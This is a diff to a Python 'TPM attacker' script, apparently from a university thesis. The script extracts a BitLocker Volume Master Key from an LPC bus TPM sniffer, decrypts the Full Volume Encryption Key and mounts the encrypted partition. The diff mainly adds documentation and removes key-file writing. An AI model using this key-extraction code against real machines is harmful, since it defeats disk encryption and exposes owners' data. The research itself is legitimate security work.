@@ -1,6 +1,22 @@
 #!/usr/bin/env python
 # -*- conding: utf-8 -*-
 
+"""
+  TPM attacker
+  This program is based on Matthias Deeg's work (@matthiasdeeg, matthias.deeg@syss.de)
+  Python tool for extracting BitLocker Volume Master Keys using
+  the FPGA-based iCEstick/iCEBreaker LPC TPM Sniffer. The encrypted Full Volume Master
+  Key (FVMK) is decrypted and used to decrypt and mount Bitlocker-encrypted partition.
+  Modifications by Ulfur Johann Edvardsson as a part of a M.Sc. thesis at DTU compute.
+
+  References:
+    http://www.latticesemi.com/icestick
+    https://www.crowdsupply.com/1bitsquared/icebreaker-fpga
+    https://github.com/lynxis/lpc_sniffer/
+    https://pulsesecurity.co.nz/articles/TPM-sniffing
+    https://github.com/SySS-Research/icestick-lpc-tpm-sniffer
+"""
+
 
 import queue
 import threading
@@ -146,18 +162,10 @@ class DataThread(threading.Thread):
                         vmk = self.key
                         results.append("Bitlocker VMK:")
                         results.append(("{}".format(self.key.hex()) + fg.rs))
-                        # save sniffer VMK to file
-                        with open(VMK_FILE, "wb") as f:
-                            f.write(self.key)
-                            # vmk = self.key
-                        print(fg.li_green + "[+] Created VMK file '{}' for use with BitLocker FVEK Decrypt".format(
-                            VMK_FILE) + fg.rs)
 
 
 def extract_metadata(drive):
     """Run the shell script extracting the metadata"""
-    # os.system('sudo /home/username/pydislocker-metadata.sh %s' % (drive))
-    # p = subprocess.check_call(['sudo dislocker-metadata -V %s' % (drive)])
     p = subprocess.run(['sudo', 'dislocker-metadata', '-V', drive, '>', 'output.txt'], stdout=subprocess.PIPE)
     metadata = p.stdout.splitlines()
 
@@ -165,26 +173,20 @@ def extract_metadata(drive):
 
 
 def fvekdecrypt(data, vmk):
+    """Decrypt the fvek"""
     global aeskey
     global results
-    # data = metadata
+
+    # search for encrypted FVEK
     i = 0
     for l in data:
         if "Datum entry type: 3" in str(l):
             break
         i += 1
 
-    # search for encrypted FVEK
-    # i = 0
-    # for l in data:
-    #    if l.find("Datum entry type: 3") != -1:
-    #        break
-    #    i += 1
-
-    # parse data in a hacky way
-    # fvek_data = data[i - 1:i + 14 + 1]
     fvek_data = []
 
+    # parse data
     for x in range(i - 1, i + 14):
         fvek_data.append(str(data[x]))
 
@@ -240,18 +242,12 @@ def fvekdecrypt(data, vmk):
         results.append("Decrypted Full Volume Encryption Key (FVEK):")
         results.append(aeskey)
 
-        # write FVEK file for use with dislocker
-        with open(FVEK_FILE, "wb") as f:
-            f.write(b"\x00\x80")
-            f.write(decrypted_fvek)
-            f.write(b"\x00" * 32)
-            print(fg.li_yellow + "[+] Created FVEK file '{}' for use with dislocker".format(FVEK_FILE) + fg.rs)
-
     except KeyError:
         print("[-] Error: Could not decrypt the encrypted Full Volume Encryption Key (FVEK)")
 
 
 def mountNgo(drive):
+    """Mount the encrypted partition"""
     global aeskey
 
     aeskey = aeskey[:64]
@@ -269,6 +265,7 @@ def mountNgo(drive):
     subprocess.call('ls /mnt/ntfs/', shell=True)
 
 def save_results():
+    # Writing results of attack to a e
     with open('sniffing_results.txt', 'w') as f:
         for line in results:
             f.write('%s\n' % line)
@@ -280,8 +277,6 @@ def save_results():
 def main(args):
     # argument1 = drive to decrypt
     drive = args.drive
-    # show banner
-    # banner()
 
     # create queue
     q = queue.Queue(32)
@@ -308,6 +303,7 @@ def main(args):
     # save the results to a txt file to use with mounter.py
     save_results()
 
+    # mount the the supplied drive
     mountNgo(drive)
 
 
@@ -316,7 +312,7 @@ def main(args):
 # main program
 if __name__ == '__main__':
     # init command line parser
-    parser = argparse.ArgumentParser("./nameofscript.py")
+    parser = argparse.ArgumentParser("./tpmattacker.py")
     parser.add_argument('-d', '--drive', type=str, required=True,
                         help='The Bitlocker encrypted partition. Usually located in /dev and has the identifier sdxy where x is a letter and y a number.')
 
